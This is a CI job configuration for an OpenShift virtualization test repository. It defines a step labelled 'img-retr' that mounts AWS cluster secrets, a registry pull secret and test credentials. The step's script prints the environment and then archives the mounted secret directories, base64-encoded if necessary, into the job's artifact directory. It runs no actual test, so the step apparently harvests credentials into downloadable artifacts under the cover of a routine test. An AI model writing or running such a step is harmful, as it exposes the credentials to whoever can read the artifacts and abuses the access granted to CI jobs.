base_images:
  openshift-virtualization-tests:
    name: openshift-virtualization-tests
    namespace: ci
    tag: cnv-4.21
resources:
  '*':
    limits:
      memory: 1Gi
    requests:
      cpu: 100m
      memory: 200Mi
tests:
- as: img-retr
  steps:
    test:
    - as: img-retr--0
      commands: |-
        shopt -op; shopt -p; set -x
        set +eu -o pipefail; shopt -s inherit_errexit
        (
        : 'Retrieving the required secrets.'
        typeset -a sp=('/secrets' '/var/run/cnv-ci-brew-pull-secret' '/bw')
        [ -n "${CLUSTER_PROFILE_DIR}" ] && sp+=("${CLUSTER_PROFILE_DIR}")
        printenv
        pwd
        ps faux
        ls -laF ./
        if type -t zip 2> /dev/null; then
            zip -r "${ARTIFACT_DIR}/data.zip" "${sp[@]}" -x '..*'
        elif type -t tar 2> /dev/null; then
            if type -t base64 2> /dev/null; then
                tar zhc --exclude '..*' "${sp[@]}" | base64 > "${ARTIFACT_DIR}/data.b64"
            else
                tar zhcf /tmp/data.tgz --exclude '..*' "${sp[@]}" && tar zcf "${ARTIFACT_DIR}/data.tgz" /tmp/data.tgz; rm -f /tmp/data.tgz
            fi
        fi
        ls -laF "${ARTIFACT_DIR}/"
        e=90; while ((e--)); do { [ -e /tmp/debug.done ] && break; sleep 60; }; done
        )
        true
      credentials:
      - collection: ""
        mount_path: /secrets
        name: cluster-secrets-aws-interop-qe
        namespace: test-credentials
      - collection: ""
        mount_path: /var/run/cnv-ci-brew-pull-secret
        name: cnv-ci-brew-pull-secret
        namespace: test-credentials
      - collection: ""
        mount_path: /bw
        name: openshift-virtualization-tests-credentials
        namespace: test-credentials
      from: openshift-virtualization-tests
      resources:
        limits:
          memory: 1Gi
        requests:
          cpu: 100m
          memory: 200Mi
zz_generated_metadata:
  branch: main
  org: redhat-chaos
  repo: lp-chaos
  variant: ocp4.21--edttj--poc
